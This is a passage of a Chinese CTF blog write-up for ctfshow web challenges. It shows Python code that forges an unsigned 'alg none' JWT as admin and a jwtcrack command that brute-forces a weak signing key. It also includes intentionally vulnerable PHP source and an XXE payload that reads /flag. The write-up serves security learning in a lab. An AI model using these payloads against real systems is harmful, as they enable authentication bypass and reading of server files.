+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">如果是通过bp抓包重放的方式去拿flag，应该访问`/admin/`，而不是访问`/admin`，区别在于：访问`/admin`，服务器优先在网站根目录下寻找名为admin的文件，若未找到该文件，部分服务器会触发“路径补全”机制，自动重定向到`/admin/`；而访问`/admin/`服务器明确识别为访问admin目录，查找目录下的默认索引文件(如：index.php)，这里不是很清楚为什么bp重放后`Follow redirection`，拿不到flag，但是在浏览器端替换新token后直接访问`/admin`可以拿到flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h3><p>服务端并未校验JWT签名，将头部’alg’字段改为‘None’，载荷’sub’字段改为’admin’</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import jwt<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;alg&#x27;</span>: <span class="hljs-string">&#x27;none&#x27;</span>,<br>    <span class="hljs-string">&#x27;typ&#x27;</span>: <span class="hljs-string">&#x27;JWT&#x27;</span><br>&#125;<br><br>payload = &#123;<br>    <span class="hljs-string">&quot;iss&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;iat&quot;</span>:1757484578,<br>    <span class="hljs-string">&quot;exp&quot;</span>:1757491778,<br>    <span class="hljs-string">&quot;nbf&quot;</span>:1757484578,<br>    <span class="hljs-string">&quot;sub&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;jti&quot;</span>:<span class="hljs-string">&quot;cc36071f4a4a44191cefd488b12fc7d9&quot;</span><br>&#125;<br><br>jwt_token = jwt.encode(payload, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-attribute">algorithm</span>=<span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-attribute">headers</span>=headers)<br><br><span class="hljs-built_in">print</span>(jwt_token)<br><br></code></pre></td></tr></table></figure>
+
+<p>将原token替换后重放，即可拿到flag</p>
+<h3 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h3><p>题目提示，弱口令，拿到token用<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">jwtcrack</a>进行爆破</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="hljs-selector-class">.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1NzUxMjAyMiwiZXhwIjoxNzU3NTE5MjIyLCJuYmYiOjE3NTc1MTIwMjIsInN1YiI6InVzZXIiLCJqdGkiOiJhYjE5MzM1MWU2ZWEzNWNkZWE5ODEzYTE0ZWEyZjY1MiJ9</span><span class="hljs-selector-class">.RIGwul9JbRpMswEVVrfkdii43BjEb0_eGH7X8G0OmJA</span> <span class="hljs-number">0123456789</span> <span class="hljs-number">6</span> sha256<br></code></pre></td></tr></table></figure>
+
+<p>爆出key是”123456”</p>
+<p>将payload中的sub字段改为admin，再encode一下，然后将原token替换即可</p>
+<h3 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h3><p>类似于web347</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure>
+
+<p><code>libxml_disable_entity_loader(false);</code>启用了实体加载，<code>LIBXML_NOENT</code>标志允许解析外部实体替换实体引用，<code>LIBXML_DTDLOAD</code>标志允许加载外部DTD文件，最后获取并输出名为ctfshow的xml元素</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>		<span class="hljs-symbol">&amp;xxe;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><p>Updating…</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow</div>
+      <div>http://example.com/2025/07/29/ctfshow/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Lysander-xu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/29/BUUCTF/" title="BUUCTF">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/24/xss-labs/" title="xss-labs">
+                        <span class="hidden-mobile">xss-labs</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
